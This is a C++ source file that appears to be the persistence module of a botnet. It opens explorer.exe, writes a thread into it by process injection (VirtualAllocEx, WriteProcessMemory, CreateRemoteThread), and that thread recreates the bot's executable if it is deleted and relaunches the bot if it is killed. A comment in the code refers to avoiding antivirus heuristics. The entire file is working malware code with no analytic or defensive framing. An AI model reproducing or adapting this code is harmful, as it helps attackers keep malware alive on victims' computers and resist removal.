#include "main.h"
#include "cthread.h"
#include "persistance.h"
#include "mainctrl.h"

#ifdef WIN32

CPersistance::CPersistance()
{
    m_szType	= "CPersistance";
	m_hThread	= NULL;
	m_bStop		= FALSE;
}

CPersistance::~CPersistance() { }

//-------------------- INJECTED CODE --------------------//
#pragma check_stack(off)
static void WINAPI PersistanceThread(INJDATA* v)
{
	HANDLE	hMutex, hFile;
	DWORD	dwAttr, dwWrittenBytes;

	//hFile = v->CreateFile(v->szBotPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	while (true)
	{
		dwAttr = v->GetFileAttributes(v->szBotPath);
		if (dwAttr == 0xFFFFFFFF) {							// File was deleted ?! Rewritting it !
			//v->CloseHandle(hFile);
			hFile = v->CreateFile(v->szBotPath, GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS,  FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile != INVALID_HANDLE_VALUE) {
				v->WriteFile(hFile, v->szBotFile, v->dwBytes, &dwWrittenBytes, NULL);
				v->CloseHandle(hFile);
			}
		}

		v->SetLastError(0);

		hMutex = v->CreateMutex(NULL, FALSE, v->szMutexName);

		if (v->GetLastError() != ERROR_ALREADY_EXISTS) {	//Bot process has been killed ?
			v->ReleaseMutex(hMutex);
			v->CloseHandle(hMutex);
			//v->CloseHandle(hFile);
			v->WinExec(v->szBotPath, SW_SHOW);				//SW_HIDE make some AVs crying. (heuristics)
			v->ExitThread(0);
			return;

		}
		v->ReleaseMutex(hMutex);
		v->CloseHandle(hMutex);	
		v->Sleep(10000);									//wait 10 secs, we dont wanna rape the CPU
	}

	return;
}

static void WINAPI Afterfunc(void) { return; }
#pragma check_stack
//------------------ END INJECTED CODE ------------------//


PDWORD CPersistance::Inject(HANDLE hProcess, DWORD cbCodeSize, LPVOID funcion)
{
	PDWORD pdwCodeRemote = NULL;
	PDWORD pdwCodeRemote2 = NULL;
	DWORD dwOldProtect, dwNumBytesXferred = 0;

	pdwCodeRemote = (PDWORD)VirtualAllocEx(hProcess, 0, cbCodeSize, MEM_COMMIT | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
	if (pdwCodeRemote == 0)
		return 0;
	if (!VirtualProtectEx(hProcess, pdwCodeRemote, cbCodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) 
		return 0;
	if (WriteProcessMemory( hProcess, pdwCodeRemote, funcion, cbCodeSize, &dwNumBytesXferred) == 0)
		return 0;

	return pdwCodeRemote;
}

BOOL CPersistance::Persistance(HANDLE hProcess)
{
	INJDATA w;
	LPVOID injDat;
	DWORD dwThreadId;
	HANDLE hThread, hFile;

    if (!hProcess)
		return FALSE;

	lstrcpy(w.szMutexName, g_pMainCtrl->m_cBot.bot_mutexname.sValue.CStr());
	GetModuleFileName(GetModuleHandle(0), w.szBotPath, sizeof(w.szBotPath)-1);

	hFile = CreateFile(w.szBotPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	memset(w.szBotFile, 0, sizeof(w.szBotFile));
	if (hFile != INVALID_HANDLE_VALUE) {
		ReadFile(hFile, w.szBotFile, sizeof(w.szBotFile), &w.dwBytes, NULL);
		CloseHandle(hFile);
	}

	// As all kernel32 and User32 functions always have the same address, 
	// they can be initialized in this process

	// kernel32.dll functions
	HMODULE hKernel32	= GetModuleHandle("kernel32.dll");
	w.GetModuleHandle	= (fnGetModuleHandle)	GetProcAddress(hKernel32,	"GetModuleHandleA");
	w.GetProcAddress	= (fnGetProcAddress)	GetProcAddress(hKernel32,	"GetProcAddress");
	w.LoadLibrary		= (fnLoadLibrary)		GetProcAddress(hKernel32,	"LoadLibraryA");
	w.FreeLibrary		= (fnFreeLibrary)		GetProcAddress(hKernel32,	"FreeLibrary");
	w.ExitThread		= (fnExitThread)		GetProcAddress(hKernel32,	"ExitThread");
	w.CreateMutex		= (fnCreateMutex)		GetProcAddress(hKernel32,	"CreateMutexA");
	w.ReleaseMutex		= (fnReleaseMutex)		GetProcAddress(hKernel32,	"ReleaseMutex");
	w.GetLastError		= (fnGetLastError)		GetProcAddress(hKernel32,	"GetLastError");
	w.SetLastError		= (fnSetLastError)		GetProcAddress(hKernel32,	"SetLastError");
	w.WinExec			= (fnWinExec)			GetProcAddress(hKernel32,	"WinExec");
	w.Sleep				= (fnSleep)				GetProcAddress(hKernel32,	"Sleep");
	w.CloseHandle		= (fnCloseHandle)		GetProcAddress(hKernel32,	"CloseHandle");
	w.CreateFile		= (fnCreateFile)		GetProcAddress(hKernel32,	"CreateFileA");
	w.GetFileAttributes	= (fnGetFileAttributes)	GetProcAddress(hKernel32,	"GetFileAttributesA");
	w.SetFileAttributes	= (fnSetFileAttributes)	GetProcAddress(hKernel32,	"SetFileAttributesA");

	// injecting functions
	w.PersistanceThread = (fnPersistanceThread)Inject(hProcess, (LPBYTE)Afterfunc - (LPBYTE)PersistanceThread, (LPVOID)PersistanceThread);
	if (w.PersistanceThread == NULL)
		return FALSE;

	injDat = Inject(hProcess, sizeof(INJDATA), &w);
	if (injDat == NULL)
		return FALSE;

	m_hThread = CreateRemoteThread(hProcess, NULL, 65535, (LPTHREAD_START_ROUTINE) w.PersistanceThread, injDat, 0, &dwThreadId);

	return TRUE; 
}

void CPersistance::Stop()
{
	m_bStop = TRUE;
	TerminateThread(m_hThread, 0);
	//return NULL;
}

void *CPersistance::Run()
{
    char *szProcName="explorer.exe";
    HANDLE hProcess;
    DWORD aProcesses[1024], cbNeeded, cProcesses;
	DWORD dwStatus=0;
	unsigned int i;
	char szProcessName[MAX_PATH];
	HMODULE hMod;
	
	while (m_bStop == FALSE)
	{
		if (m_hThread != NULL) {
			if (GetExitCodeThread(m_hThread, &dwStatus) == TRUE) {
				if (dwStatus == STILL_ACTIVE) {
					Sleep(10000);
					continue;
				}
			}
			m_hThread = NULL;
		}
				

		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
			return false;

		cProcesses=cbNeeded/sizeof(DWORD);

		for (i=0; i<cProcesses; i++)
		{
			strcpy(szProcessName, "unknown");
			hProcess=OpenProcess(PROCESS_ALL_ACCESS, FALSE, aProcesses[i]);
			if (hProcess)
			{
				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
				{
					GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
					if (!stricmp(szProcessName, szProcName))
					{
						if (Persistance(hProcess) == FALSE) {
#ifdef DBGCONSOLE
							g_pMainCtrl->m_cConsDbg.Log(1, "Unable to inject in explorer ! (%d).\n", GetLastError());
#endif // DBGCONSOLE
						}
						Sleep(10000);
					}
				}
				CloseHandle(hProcess);
			}
		}
		Sleep(250);
	}

    return NULL;
}

#endif // WIN32
